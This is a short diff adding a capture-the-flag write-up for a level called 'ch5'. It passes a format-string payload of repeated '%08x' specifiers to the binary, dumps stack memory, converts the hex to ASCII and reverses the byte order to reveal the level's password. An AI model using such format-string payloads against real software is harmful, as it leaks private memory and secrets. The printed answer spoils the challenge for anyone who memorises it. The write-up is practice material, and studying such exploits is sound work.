@@ -1,0 +1,17 @@
+./ch5 "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
+--> 00000020 0804b008 b7fcfff4 08048570 08049ff4 00000002 bffffcc4 b7fd03e4 0000000d 0804b008 39617044 28293664 6d617045 b7000a64
+
+convert Hex to ascii:
+http://www.rapidtables.com/convert/number/hex-to-ascii.htm
+
+Conversion:
+ °·üÿôpô¿ÿüÄ·ýä
+ °9apD()6dmapE·
+ d
+
+ take the four parts and rotate:
+ 9apD	()6d	mapE	d
+ Dpa9	d6)(	Epam	d
+ 
+ the pwd is :
+ Dpa9d6)(Epamd
